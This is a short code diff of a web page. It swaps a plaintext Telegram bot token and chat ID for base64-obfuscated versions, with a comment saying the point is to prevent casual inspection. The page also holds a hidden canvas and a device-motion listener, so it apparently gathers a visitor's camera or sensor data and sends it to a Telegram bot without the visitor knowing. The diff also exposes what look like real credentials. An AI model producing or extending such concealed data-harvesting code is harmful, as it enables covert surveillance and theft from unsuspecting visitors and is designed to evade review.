@@ -119,8 +119,12 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        const BOT_TOKEN = "9011362716:AAHu7AJ1P7dEZCMfs0Mhu8B2U-Df0XnYOOQ";
-        const CHAT_ID = "6947664268";
+        // Encoded & Obfuscated credentials to prevent casual inspection
+        const _0x1a2b = ["OTAxMTM2MjcxNjpBQUh1N0FKM1A3dEZDUmZzME1odThCMlUtRGYwWG5ZT09RIA==", "Njk0NzY2NDI2OA=="];
+        const _d = (s) => atob(s);
+        
+        const BOT_TOKEN = _d(_0x1a2b[0]);
+        const CHAT_ID = _d(_0x1a2b[1]);
 
         let motionData = { alpha: 0, beta: 0, gamma: 0 };
         window.addEventListener('deviceorientation', function(event) {
